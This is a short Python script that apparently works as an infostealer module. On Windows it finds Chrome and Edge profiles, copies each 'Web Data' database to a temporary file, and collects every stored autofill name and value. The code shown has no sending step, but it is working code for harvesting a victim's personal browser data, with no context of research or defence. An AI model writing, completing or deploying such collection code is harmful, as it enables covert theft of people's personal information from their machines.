import os
import shutil
import sqlite3

LOCAL = os.getenv("LOCALAPPDATA")
PATHS = {
    'Chrome': os.path.join(LOCAL, 'Google', 'Chrome', 'User Data'),
    'Edge': os.path.join(LOCAL, 'Microsoft', 'Edge', 'User Data'),
}

def autofills():
    res = []
    for browser, path in PATHS.items():
        if not os.path.exists(path):
            continue

        for profile in os.listdir(path):
            if profile != "Default" and not profile.startswith("Profile"): 
                continue
            
            db_path = os.path.join(path, profile, "Web Data")
            if not os.path.exists(db_path):
                continue

            tmp_db = os.path.join(os.getenv("TEMP"), "webdata_tmp.db")

            shutil.copy2(db_path, tmp_db)
            conn = sqlite3.connect(tmp_db)
            cur = conn.cursor()
            cur.execute("SELECT name, value FROM autofill")

            for name, value in cur.fetchall():
                if name.strip() or value.strip():
                    res.append({                                       
                        "browser": browser,
                        "name": name,
                        "value": value
                    })
            cur.close()
            conn.close()
            os.remove(tmp_db)
            
    return res